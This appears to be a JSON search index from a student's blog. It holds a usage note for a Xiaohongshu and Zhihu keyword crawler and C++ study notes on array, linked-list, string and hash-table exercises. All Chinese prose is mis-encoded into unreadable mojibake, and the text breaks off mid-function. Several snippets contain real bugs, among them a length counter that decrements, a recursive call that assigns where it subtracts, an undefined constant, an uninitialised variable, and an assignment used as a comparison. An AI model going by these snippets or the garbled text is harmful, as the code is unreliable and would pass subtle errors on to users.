[{"content":"å°çº¢ä¹¦çˆ¬è™« 1 python main.py --paltform xhs --lt qrcode --type search ä¿®æ”¹äº†configä¸‹çš„é…ç½®æ–‡ä»¶ï¼Œæœ€å¥½ä¸è¦å¼€å¹¶å‘ï¼Œä¼šå‘ç°çˆ¬äº†ä¸€æ®µæ—¶é—´çˆ¬ä¸äº†ï¼Œä¿®æ”¹keywordsä¸ºå®ä½“æ¸…å•ï¼Œdb_configä¸ºnkuwikiæ•°æ®åº“é…ç½®ï¼Œä½¿ç”¨GET_IMAGESå’ŒGET_COMMENTï¼Œåˆ†ä¸¤æ¬¡çˆ¬å–ï¼Œä¸€æ¬¡å¯¼å…¥æ•°æ®åº“ï¼Œä¸€æ¬¡å¯¼å…¥æœ¬åœ°ä»¥jsonæ ¼å¼ï¼Œæ”¹START_DAYå’ŒEND_DAY\nçŸ¥ä¹çˆ¬è™« 1 python main.py --platform zhihu --lt qrcode --type search åŒä¸Šï¼Œå›¾ç‰‡å’Œè¯„è®ºä¸å¼€,å¯ä»¥å¹¶å‘çˆ¬å–ï¼Œæœ€å¤šçˆ¬å–é¡µæ•°1000\nQAï¼šå¦‚ä½•å¤„ç†æ•°æ®ï¼Œæ¸²æŸ“sï¼Ÿ\næ³ªäº†ï¼Œutoolsä¸‹è‡ªå·±åŠ äº†ä¸ªè„šæœ¬\n1 python utools/xhs_to_md.py è¾“å‡ºåœ¨docs/xhsä¸‹\n1 python scripts/zhihu_json_to_md.py è¾“å‡ºåœ¨data/zhihu/markdownä¸‹\n","date":"2025-03-23T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nkuwiki%E7%88%AC%E8%99%AB%E8%AF%B4%E6%98%8E/","title":"NKUwikiçˆ¬è™«è¯´æ˜"},{"content":"æ•°ç»„ äºŒåˆ†æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution { public: int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int left = 0 ; int right =nums.size()-1; while (left \u0026lt;= right ){ int middle = left + ((right-left)/2); if (target \u0026lt; nums[middle]){ right = middle-1; } else if (target \u0026gt; nums[middle]){ left = middle+1; }else{ return middle; } } return -1; } }; ç¿»è½¬é“¾è¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: ListNode* reverseList(ListNode* head) { ListNode* temp; ListNode* cur = head; ListNode* pre = NULL; while(cur){ temp=cur-\u0026gt;next;//æš‚æ—¶ä¿å­˜curçš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ cur-\u0026gt;next=pre;//åè½¬ pre=cur;//æ›´æ–°preå’ŒcuræŒ‡é’ˆ cur=temp; } return pre; } }; ç¯å½¢é“¾è¡¨\nå…ˆæ‰¾ç¯å½¢é“¾è¡¨ç›¸é‡ç‚¹\nä»å¤´ç»“ç‚¹å‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œä»ç›¸é‡èŠ‚ç‚¹ ä¹Ÿå‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆæ¯æ¬¡åªèµ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ é‚£ä¹ˆå½“è¿™ä¸¤ä¸ªæŒ‡é’ˆç›¸é‡çš„æ—¶å€™å°±æ˜¯ ç¯å½¢å…¥å£çš„èŠ‚ç‚¹ã€‚\næšä¸¾ ä¸€ä¸ªæ•°ç»„ä¸­çš„æ•°äº’ä¸ç›¸åŒï¼Œæ±‚å…¶ä¸­å’Œä¸º çš„æ•°å¯¹çš„ä¸ªæ•°\n1 2 3 4 5 6 7 int ans = 0; for(int i=0;i\u0026lt;n;i++) for(int j=0;j\u0026lt;i;j++) if (a[i]+a[j]=0) ++ans; ä¼˜åŒ–å\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;cstring\u0026gt; constexpr int MAXN = 100000; //MAXNæ˜¯æ•°ç»„å†…å…ƒç´ çš„ç•Œ int solve(int n,int a[]){ bool met[MAX*2+1];//åˆ›å»ºä¸€ä¸ªèƒ½è£…ä¸‹[-MAXN,MAXN]çš„æ¡¶ memset(met,0,sizeof(met)); int ans = 0; for(int i =0;i\u0026lt;n;++i){ if(met[MAXN-a[i]]) ++ans;//å¦‚æœæ¡¶å†…æœ‰æƒ³è¦çš„å…ƒç´ ï¼ŒansåŠ ä¸€ met[MAXN+a[i]]=true;//æŠŠå½“å‰å…ƒç´ æ”¾å…¥æ¡¶ } return ans; } ä¸ªäººç†è§£ï¼Œä¸€å¼€å§‹æŠŠæ¡¶åˆå§‹åŒ–å…¨éƒ¨ä¸ºfalseï¼Œç¬¬ä¸€ä¸ªå‡ºç°å…ƒç´ ï¼Œansè¿˜æ˜¯ä¸º0ï¼Œä½†æ˜¯æŠŠè¿™ä¸ªå…ƒç´ æ”¾å…¥æ¡¶å†…ï¼Œæ¯”å¦‚å‡è®¾ MAXN = 100000ï¼Œæ•°ç»„ a[] = [1, -1, 2, -2, 3]ï¼Œn = 5ï¼Œéå†æ•°ç»„ï¼Œa[0]=1,MAXN-1=99999ï¼Œmet[99999]ä¸ºfalse,-1è¿˜æ²¡å‡ºç°è¿‡ï¼Œå°†met[MAXN+1]=met[100001]è®¾ä¸ºtrue,æ‰¾ç¬¬äºŒä¸ªæ•°a[1]=-1ï¼Œmet[MAXN-(-1)]=met[100001]ä¸ºtrueï¼Œ1å·²ç»å‡ºç°è¿‡ï¼Œans++,ç„¶åå°†met[MAXN+(-1)]=met[99999]è®¾ç½®ä¸ºTRUE\u0026hellip;\u0026hellip;æ—¶é—´å¤æ‚åº¦ä¸ºO(n)\næ¨¡æ‹Ÿ ä¸€åªé•¿åº¦ä¸è®¡çš„è •è™«ä½äº è‹±å¯¸æ·±çš„äº•çš„åº•éƒ¨ã€‚å®ƒæ¯æ¬¡å‘ä¸Šçˆ¬ è‹±å¯¸ï¼Œä½†æ˜¯å¿…é¡»ä¼‘æ¯ä¸€æ¬¡æ‰èƒ½å†æ¬¡å‘ä¸Šçˆ¬ã€‚åœ¨ä¼‘æ¯çš„æ—¶å€™ï¼Œå®ƒæ»‘è½äº† è‹±å¯¸ã€‚ä¹‹åå®ƒå°†é‡å¤å‘ä¸Šçˆ¬å’Œä¼‘æ¯çš„è¿‡ç¨‹ã€‚è •è™«çˆ¬å‡ºäº•å£éœ€è¦è‡³å°‘çˆ¬å¤šå°‘æ¬¡ï¼Ÿå¦‚æœè •è™«çˆ¬å®Œååˆšå¥½åˆ°è¾¾äº•çš„é¡¶éƒ¨ï¼Œæˆ‘ä»¬ä¹Ÿè®¾ä½œè •è™«å·²ç»çˆ¬å‡ºäº•å£ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;iostream\u0026gt; int main(){ int n ,u,d; std::cin\u0026gt;\u0026gt;u\u0026gt;\u0026gt;d\u0026gt;\u0026gt;n; int dist,chance = 0; while(1){ dist+=u; chance++; if(dist\u0026gt;=n)break; dist -= d; } std::cout \u0026lt;\u0026lt; chance \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } é€’å½’\u0026amp;åˆ†æ²» åœ¨å‡½æ•°ä¸­è°ƒç”¨è‡ªèº«\nç»“æŸæ¡ä»¶ è‡ªæˆ‘è°ƒç”¨ 1 2 3 4 5 6 7 8 9 int size(Node *head){ int size=0; for(Node *p=head;p !=nullptr;p=p-\u0026gt;next) size--; return size; } int size_recursion(Node *head){ if(head == nullptr) return 0; return size_recursion(head-\u0026gt;next)+1; } ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œå®ƒçš„æ¯ä¸ªç»“ç‚¹éƒ½å­˜æ”¾ç€ä¸€ä¸ªæ•´æ•°å€¼ã€‚\næ‰¾å‡ºè·¯å¾„å’Œç­‰äºç»™å®šæ•°å€¼çš„è·¯å¾„æ€»æ•°ã€‚\nè·¯å¾„ä¸éœ€è¦ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œä¹Ÿä¸éœ€è¦åœ¨å¶å­èŠ‚ç‚¹ç»“æŸï¼Œä½†æ˜¯è·¯å¾„æ–¹å‘å¿…é¡»æ˜¯å‘ä¸‹çš„ï¼ˆåªèƒ½ä»çˆ¶èŠ‚ç‚¹åˆ°å­èŠ‚ç‚¹ï¼‰ã€‚\näºŒå‰æ ‘ä¸è¶…è¿‡ 1000 ä¸ªèŠ‚ç‚¹ï¼Œä¸”èŠ‚ç‚¹æ•°å€¼èŒƒå›´æ˜¯ [-1000000,1000000] çš„æ•´æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 struct TreeNode{ int val; TreeNode *left; TreeNode *right; TreeNode(int x ):val(x),left(nullptr),right(nullptr); } int count (TreeNode *node ,int sum){ if (node ==nullptr) return 0; return (node -\u0026gt; val == sum)+ count(node-\u0026gt;left,sum=node-\u0026gt;val)+count(node-\u0026gt;right,sum-node-\u0026gt;val); } int pathSum(TreeNode *root,int sum){ if(root == nullptr)return 0 ; return count(root,sum)+pathSum(root-\u0026gt;left,sum)+pathSum(root-\u0026gt;right,sum); } pathSumå‡½æ•°ï¼ŒäºŒå‰æ ‘çš„éå†æ¡†æ¶ï¼Œåˆ†åˆ«å¯¹å·¦å³å·¦å­æ ‘é€’å½’è°ƒç”¨å‡½æ•°æœ¬çœ\ncountå‡½æ•°æ¯ä¸ªèŠ‚ç‚¹å’Œå­æ ‘\nè´ªå¿ƒç®—æ³• æ’åºè§£æ³• æ°é€¢ H å›½å›½åº†ï¼Œå›½ç‹é‚€è¯· n ä½å¤§è‡£æ¥ç©ä¸€ä¸ªæœ‰å¥–æ¸¸æˆã€‚é¦–å…ˆï¼Œä»–è®©æ¯ä¸ªå¤§è‡£åœ¨å·¦ã€å³æ‰‹ä¸Šé¢åˆ†åˆ«å†™ä¸‹ä¸€ä¸ªæ•´æ•°ï¼Œå›½ç‹è‡ªå·±ä¹Ÿåœ¨å·¦ã€å³æ‰‹ä¸Šå„å†™ä¸€ä¸ªæ•´æ•°ã€‚ç„¶åï¼Œè®©è¿™ n ä½å¤§è‡£æ’æˆä¸€æ’ï¼Œå›½ç‹ç«™åœ¨é˜Ÿä¼çš„æœ€å‰é¢ã€‚æ’å¥½é˜Ÿåï¼Œæ‰€æœ‰çš„å¤§è‡£éƒ½ä¼šè·å¾—å›½ç‹å¥–èµçš„è‹¥å¹²é‡‘å¸ï¼Œæ¯ä½å¤§è‡£è·å¾—çš„é‡‘å¸æ•°åˆ†åˆ«æ˜¯ï¼šæ’åœ¨è¯¥å¤§è‡£å‰é¢çš„æ‰€æœ‰äººçš„å·¦æ‰‹ä¸Šçš„æ•°çš„ä¹˜ç§¯é™¤ä»¥ä»–è‡ªå·±å³æ‰‹ä¸Šçš„æ•°ï¼Œç„¶åå‘ä¸‹å–æ•´å¾—åˆ°çš„ç»“æœã€‚\nå›½ç‹ä¸å¸Œæœ›æŸä¸€ä¸ªå¤§è‡£è·å¾—ç‰¹åˆ«å¤šçš„å¥–èµï¼Œæ‰€ä»¥ä»–æƒ³è¯·ä½ å¸®ä»–é‡æ–°å®‰æ’ä¸€ä¸‹é˜Ÿä¼çš„é¡ºåºï¼Œä½¿å¾—è·å¾—å¥–èµæœ€å¤šçš„å¤§è‡£ï¼Œæ‰€è·å¥–èµå°½å¯èƒ½çš„å°‘ã€‚æ³¨æ„ï¼Œå›½ç‹çš„ä½ç½®å§‹ç»ˆåœ¨é˜Ÿä¼çš„æœ€å‰é¢ã€‚\noperator\u0026lt;ï¼šæ¯”è¾ƒå½“å‰å¯¹è±¡*thiså’Œä¼ å…¥å¯¹è±¡x\n1 2 3 4 5 6 7 struct uv{ int a,b; bool operator\u0026lt;(const uv \u0026amp;x) const{ return max(x.b,a*b)\u0026lt;max(b,x.a*x.b) } }; åæ‚”è§£æ³• å­—ç¬¦ä¸² åè½¬å­—ç¬¦ä¸² 1 2 3 4 5 6 7 8 class Solution { public: void reverseString(vector\u0026lt;char\u0026gt;\u0026amp; s) { for(int i =0,j=s.size()-1;i\u0026lt;s.size()/2;i++,j--){ swap(s[i],s[j]); } } }; swapçš„ä¸¤ç§å®ç°\n1 2 3 int tmp = s[i]; s[i]=s[j]; s[j]=tmp; 1 2 3 s[i]^=s[j]; s[j]^=s[i]; s[i]^=s[j]; åè½¬å­—ç¬¦ä¸²2 ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² s å’Œä¸€ä¸ªæ•´æ•° kï¼Œä»å­—ç¬¦ä¸²å¼€å¤´ç®—èµ·, æ¯è®¡æ•°è‡³ 2k ä¸ªå­—ç¬¦ï¼Œå°±åè½¬è¿™ 2k ä¸ªå­—ç¬¦ä¸­çš„å‰ k ä¸ªå­—ç¬¦ã€‚\nå¦‚æœå‰©ä½™å­—ç¬¦å°‘äº k ä¸ªï¼Œåˆ™å°†å‰©ä½™å­—ç¬¦å…¨éƒ¨åè½¬ã€‚\nå¦‚æœå‰©ä½™å­—ç¬¦å°äº 2k ä½†å¤§äºæˆ–ç­‰äº k ä¸ªï¼Œåˆ™åè½¬å‰ k ä¸ªå­—ç¬¦ï¼Œå…¶ä½™å­—ç¬¦ä¿æŒåŸæ ·ã€‚\nç¤ºä¾‹:\nè¾“å…¥: s = \u0026ldquo;abcdefg\u0026rdquo;, k = 2 è¾“å‡º: \u0026ldquo;bacdfeg\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: string reverseStr(string s, int k) { for(int i =0;i\u0026lt;s.size();i+=(2*k)){ if(i+k\u0026lt;=s.size()){ reverse(s.begin()+i,s.begin()+i+k); }else{//å‰©ä½™å­—ç¬¦å°‘äºkä¸ªï¼Œåˆ™å…¨éƒ¨åè½¬ reverse(s.begin()+i,s.end()); } } return s; } }; æ³¨æ„forçš„æ„é€ \nç¿»è½¬å­—ç¬¦ä¸²çš„å•è¯ å»é™¤å¤šä½™ç©ºæ ¼ å…¨éƒ¨ç¿»è½¬ å¯¹äºæ¯ä¸ªå•è¯å•ç‹¬åè½¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 class Solution { public: void reverse(string\u0026amp;s,int start,int end){ for(int i = start,j=end;i\u0026lt;j;i++,j--){ swap(s[i],s[j]); } } void removeExtraSpaces(string\u0026amp; s) { int slowIndex = 0, fastIndex = 0; // å®šä¹‰å¿«æŒ‡é’ˆï¼Œæ…¢æŒ‡é’ˆ // å»æ‰å­—ç¬¦ä¸²å‰é¢çš„ç©ºæ ¼ while (s.size() \u0026gt; 0 \u0026amp;\u0026amp; fastIndex \u0026lt; s.size() \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { fastIndex++; } for (; fastIndex \u0026lt; s.size(); fastIndex++) { // å»æ‰å­—ç¬¦ä¸²ä¸­é—´éƒ¨åˆ†çš„å†—ä½™ç©ºæ ¼ if (fastIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[fastIndex - 1] == s[fastIndex] \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { continue; } else { s[slowIndex++] = s[fastIndex]; } } if (slowIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[slowIndex - 1] == \u0026#39; \u0026#39;) { // å»æ‰å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ s.resize(slowIndex - 1); } else { s.resize(slowIndex); // é‡æ–°è®¾ç½®å­—ç¬¦ä¸²å¤§å° } } string reverseWords(string s) { removeExtraSpaces(s);//å»é™¤å¤šä½™ç©ºæ ¼ï¼Œä¿è¯å•è¯ä¹‹é—´åªæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸”å­—ç¬¦ä¸²é¦–å°¾æ²¡ç©ºæ ¼ reverse(s,0,s.size()-1); int start=0; for(int i=0;i\u0026lt;=s.size();++i){ if(i==s.size()||s[i]==\u0026#39; \u0026#39;){//åˆ°è¾¾ç©ºæ ¼æˆ–è€…å•è¯æœ€å reverse(s,start,i-1);//åè½¬ï¼Œæ³¨æ„æ˜¯å·¦é—­å³é—­ start = i+1;//æ›´æ–°ä¸‹ä¸€ä¸ªå•è¯çš„start } } return s; } }; åŒæŒ‡é’ˆè§£æ³•ï¼ŒåŠ æ·±ç†è§£ï¼Œå¿«æŒ‡é’ˆæœ‰è¯•éªŒçš„æ€§è´¨ï¼Œå¦‚æœæœ‰å¤šä¸ªç©ºæ ¼è·³åˆ°æœ€åä¸€ä¸ªç©ºæ ¼è®©æ…¢æŒ‡é’ˆåŒæ­¥\né‡å¤çš„å­å­—ç¬¦ä¸² åˆ¤æ–­å­—ç¬¦ä¸²sæ˜¯å¦æœ‰é‡å¤å­—ä¸²ï¼Œåªè¦ä¸¤ä¸ªsæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œé‡Œé¢è¿˜å‡ºç°ä¸€ä¸ªsçš„è¯ï¼ˆæå¤´å»å°¾é¿å…æ‰¾çš„æ˜¯åŸå…ˆçš„sï¼‰ï¼Œå°±è¯´æ˜æ˜¯ç”±é‡å¤å­—ä¸²ç»„æˆ\n1 2 3 4 5 6 7 8 9 10 11 class Solution { public: bool repeatedSubstringPattern(string s) { string t =s+s; t.erase(t.begin()); t.erase(t.end()-1);//æå¤´å»å°¾ if(t.find(s)!=std::string::npos) {return true; }else{return false;} } }; å“ˆå¸Œè¡¨ æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: bool isAnagram(string s, string t) { int record[26]={0};//åˆå§‹åŒ–ä¸º0 for(int i=0;i\u0026lt;s.size();i++){ record[s[i]-\u0026#39;a\u0026#39;]++; } for(int i = 0;i\u0026lt;t.size();i++){ record[t[i]-\u0026#39;a\u0026#39;]--; } for (int i=0;i\u0026lt;26;i++){ if (record[i]!=0){ return false; } } return true; } }; å¦‚æœä¸¤ä¸ªå•è¯æ˜¯å¼‚ä½è¯çš„è¯ï¼Œé‚£ä¹ˆæœ€ç»ˆrecordå…ƒç´ åº”è¯¥å…¨éƒ¨éƒ½ä¸º0\nä¸¤ä¸ªæ•°ç»„çš„äº¤é›† æ³¨æ„ï¼Œä½¿ç”¨æ•°ç»„æ¥åšå“ˆå¸Œçš„é¢˜ç›®ï¼Œæ˜¯å› ä¸ºé¢˜ç›®é™åˆ¶äº†æ•°å€¼çš„å¤§å°ï¼Œè€Œè¿™é“é¢˜ç›®æ²¡æœ‰é™åˆ¶æ•°å€¼çš„å¤§å°ï¼Œå°±æ— æ³•ä½¿ç”¨æ•°ç»„æ¥åšå“ˆå¸Œè¡¨\nstd::setå…ƒç´ å”¯ä¸€ä¸”æœ‰åºï¼Œä¸æ”¯æŒç›´æ¥ä¿®æ”¹å…ƒç´ ï¼Œå¿…é¡»å…ˆåˆ é™¤å†æ’å…¥ std::multisetå…ƒç´ å¯ä»¥é‡å¤ä¸”æœ‰åºï¼Œä¸æ”¯æŒç›´æ¥ä¿®æ”¹å…ƒç´ ï¼Œå¿…é¡»å…ˆåˆ é™¤å†æ’å…¥ std::unordered_setå…ƒç´ å”¯ä¸€ä¸”æ— åºï¼Œä¸æ”¯æŒç›´æ¥ä¿®æ”¹å…ƒç´ ï¼Œå¿…é¡»å…ˆåˆ é™¤å†æ’å…¥ std::setå’Œstd::multisetåº•å±‚å®ç°éƒ½æ˜¯çº¢é»‘æ ‘ï¼Œstd::unordered_setçš„åº•å±‚å®ç°æ˜¯å“ˆå¸Œè¡¨ï¼Œ ä½¿ç”¨unordered_set è¯»å†™æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œå¹¶ä¸éœ€è¦å¯¹æ•°æ®è¿›è¡Œæ’åºï¼Œè€Œä¸”è¿˜ä¸è¦è®©æ•°æ®é‡å¤ï¼Œæ‰€ä»¥é€‰æ‹©unordered_setã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: vector\u0026lt;int\u0026gt; intersection(vector\u0026lt;int\u0026gt;\u0026amp; nums1, vector\u0026lt;int\u0026gt;\u0026amp; nums2) { unordered_set\u0026lt;int\u0026gt; result_set;//å­˜æ”¾ç»“æœ int hash[1005]={0}; for(int num:nums1){//æ¯æ¬¡å¾ªç¯nums1çš„å€¼éƒ½ä¼šèµ‹ç»™num hash[num]=1; } for (int num:nums2){ if(hash[num]==1){ result_set.insert(num); } } return vector\u0026lt;int\u0026gt;(result_set.begin(),result_set.end()); } }; å¾ˆå·§å¦™çš„è§£æ³•ï¼Œç›¸å½“äºhashæ˜¯ä¸ªæ˜ å°„è¡¨ï¼Œå…ˆæŠŠnums1æ˜ å°„åˆ°hashè¡¨ä¸Šï¼Œæ˜ å°„æ–¹å¼å°±æ˜¯æŸ¥æ‰¾ä½ç½®ï¼Œåœ¨æŸ¥è¯¢nums2å…ƒç´ åœ¨hashè¡¨ä¸Šçš„ä½ç½®ï¼Œä¹Ÿæ˜¯ç”¨åŒæ ·çš„æ–¹å¼ï¼Œæœ‰ç‚¹åƒåŠ å¯†ç®—æ³•ï¼ˆåªä¸è¿‡è¿™ä¸ªç®—æ³•å¾ˆç®€å•ï¼‰\nå¿«ä¹æ•° ç¼–å†™ä¸€ä¸ªç®—æ³•æ¥åˆ¤æ–­ä¸€ä¸ªæ•° n æ˜¯ä¸æ˜¯å¿«ä¹æ•°ã€‚\nã€Œå¿«ä¹æ•°ã€å®šä¹‰ä¸ºï¼šå¯¹äºä¸€ä¸ªæ­£æ•´æ•°ï¼Œæ¯ä¸€æ¬¡å°†è¯¥æ•°æ›¿æ¢ä¸ºå®ƒæ¯ä¸ªä½ç½®ä¸Šçš„æ•°å­—çš„å¹³æ–¹å’Œï¼Œç„¶åé‡å¤è¿™ä¸ªè¿‡ç¨‹ç›´åˆ°è¿™ä¸ªæ•°å˜ä¸º 1ï¼Œä¹Ÿå¯èƒ½æ˜¯ æ— é™å¾ªç¯ ä½†å§‹ç»ˆå˜ä¸åˆ° 1ã€‚å¦‚æœ å¯ä»¥å˜ä¸º 1ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±æ˜¯å¿«ä¹æ•°ã€‚\nå¦‚æœ n æ˜¯å¿«ä¹æ•°å°±è¿”å› True ï¼›ä¸æ˜¯ï¼Œåˆ™è¿”å› False ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution { public: int getSum(int n) {//è®¡ç®—å„ä½æ•°çš„å¹³æ–¹å’Œ int sum=0; while(n){ sum+=(n%10)*(n%10); n/=10; } return sum; } bool isHappy(int n){ unordered_set\u0026lt;int\u0026gt; set; while(1){ int sum = getSum(n); if(sum == 1){ return true; } if(set.find(sum)!=set.end()){//æ£€æŸ¥sumå‡ºç°åœ¨å®¹å™¨ä¸­ï¼Œå¦‚æœsumæ›¾ç»å‡ºç°è¿‡ï¼Œè¯´æ˜å·²ç»é™·å…¥äº†æ— çº¿å¾ªç¯ï¼Œç«‹åˆ»return false return false; }else{ set.insert(sum); } n=sum; } } }; ä¸¤æ•°ä¹‹å’Œ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚\nä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ ä¸èƒ½ä½¿ç”¨ä¸¤éã€‚\nç¤ºä¾‹:\nç»™å®š nums = [2, 7, 11, 15], target = 9\nå› ä¸º nums[0] + nums[1] = 2 + 7 = 9\næ‰€ä»¥è¿”å› [0, 1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { std::unordered_map \u0026lt;int,int\u0026gt; map; for(int i=0;i\u0026lt;nums.size();i++){ //å¯»æ‰¾æ˜¯å¦æœ‰åŒ¹é…çš„keyï¼Œautoç”¨æ¥è‡ªåŠ¨åŒ¹é…æ•°å€¼ç±»å‹ auto iter = map.find(target-nums[i]); if(iter!=map.end()){//iteræ˜¯å¦åœ¨å®¹å™¨ä¸­ return {iter -\u0026gt;second,i};//iter-\u0026gt;second æ˜¯åŒ¹é…é”®å¯¹åº”çš„å€¼ï¼ˆå³ä¹‹å‰å­˜å‚¨çš„ä¸‹æ ‡ï¼‰ï¼Œè¿”å›ä¸¤ä¸ªä¸‹æ ‡ } map.insert(pair\u0026lt;int,int\u0026gt;(nums[i],i));//å¦‚æœæ²¡æ‰¾åˆ°åŒ¹é…å¯¹ï¼Œå°±æŠŠè®¿é—®è¿‡çš„å…ƒç´ å’Œä¸‹æ ‡åŠ å…¥åˆ°mapä¸­ } return{}; } }; QA1:ä¸ºä»€ä¹ˆä¼šæƒ³åˆ°ç”¨å“ˆå¸Œè¡¨ï¼Ÿ\nåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨\nQA2:å“ˆå¸Œè¡¨ä¸ºä»€ä¹ˆç”¨mapï¼Ÿ\nä¸ªäººè®¤ä¸ºmapæœ‰ç‚¹åƒpythoné‡Œé¢çš„å­—å…¸ï¼Œå¯ä»¥æŸ¥è¯¢é”®å€¼å¯¹ã€‚\næ•°ç»„çš„å¤§å°æ˜¯å—é™åˆ¶çš„ï¼Œè€Œä¸”å¦‚æœå…ƒç´ å¾ˆå°‘ï¼Œè€Œå“ˆå¸Œå€¼å¤ªå¤§ä¼šé€ æˆå†…å­˜ç©ºé—´çš„æµªè´¹ã€‚ setæ˜¯ä¸€ä¸ªé›†åˆï¼Œé‡Œé¢æ”¾çš„å…ƒç´ åªèƒ½æ˜¯ä¸€ä¸ªkeyï¼Œè€Œä¸¤æ•°ä¹‹å’Œè¿™é“é¢˜ç›®ï¼Œä¸ä»…è¦åˆ¤æ–­yæ˜¯å¦å­˜åœ¨è€Œä¸”è¿˜è¦è®°å½•yçš„ä¸‹æ ‡ä½ç½®ï¼Œå› ä¸ºè¦è¿”å›x å’Œ yçš„ä¸‹æ ‡ã€‚æ‰€ä»¥set ä¹Ÿä¸èƒ½ç”¨ã€‚ æ­¤æ—¶å°±è¦é€‰æ‹©å¦ä¸€ç§æ•°æ®ç»“æ„ï¼šmap ï¼Œmapæ˜¯ä¸€ç§key valueçš„å­˜å‚¨ç»“æ„ï¼Œå¯ä»¥ç”¨keyä¿å­˜æ•°å€¼ï¼Œç”¨valueå†ä¿å­˜æ•°å€¼æ‰€åœ¨çš„ä¸‹æ ‡ã€‚ä¸éœ€è¦keyæœ‰åºï¼Œé€‰æ‹©std:unordered_mapæ•ˆç‡æ›´é«˜\nQA3ï¼šæœ¬é¢˜çš„mapæ˜¯ç”¨æ¥å­˜ä»€ä¹ˆçš„ï¼Ÿ\nå­˜æ”¾è®¿é—®è¿‡çš„å…ƒç´ \nQA4ï¼šmapä¸­çš„keyå’Œvalueç”¨æ¥å­˜ä»€ä¹ˆï¼Ÿ\nkeyï¼šæ•°ç»„å…ƒç´ ï¼Œvalueï¼šæ•°ç»„å…ƒç´ ä¸‹æ ‡\nèµé‡‘ä¿¡ ç»™å®šä¸€ä¸ªèµé‡‘ä¿¡ (ransom) å­—ç¬¦ä¸²å’Œä¸€ä¸ªæ‚å¿—(magazine)å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸² ransom èƒ½ä¸èƒ½ç”±ç¬¬äºŒä¸ªå­—ç¬¦ä¸² magazines é‡Œé¢çš„å­—ç¬¦æ„æˆã€‚å¦‚æœå¯ä»¥æ„æˆï¼Œè¿”å› true ï¼›å¦åˆ™è¿”å› falseã€‚\n(é¢˜ç›®è¯´æ˜ï¼šä¸ºäº†ä¸æš´éœ²èµé‡‘ä¿¡å­—è¿¹ï¼Œè¦ä»æ‚å¿—ä¸Šæœç´¢å„ä¸ªéœ€è¦çš„å­—æ¯ï¼Œç»„æˆå•è¯æ¥è¡¨è¾¾æ„æ€ã€‚æ‚å¿—å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦åªèƒ½åœ¨èµé‡‘ä¿¡å­—ç¬¦ä¸²ä¸­ä½¿ç”¨ä¸€æ¬¡ã€‚)\næ³¨æ„ï¼š\nä½ å¯ä»¥å‡è®¾ä¸¤ä¸ªå­—ç¬¦ä¸²å‡åªå«æœ‰å°å†™å­—æ¯ã€‚\ncanConstruct(\u0026ldquo;a\u0026rdquo;, \u0026ldquo;b\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;ab\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;aab\u0026rdquo;) -\u0026gt; true\nå‘ä¸€ï¼šæš´åŠ›ç ´è§£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution { public: bool canConstruct(string ransomNote, string magazine) { for (int i = 0; i \u0026lt; magazine.length(); i++) { for (int j = 0; j \u0026lt; ransomNote.length(); j++) { if (magazine[i] == ransomNote[j]) { ransomNote.erase(ransomNote.begin() + j); break; } } } if 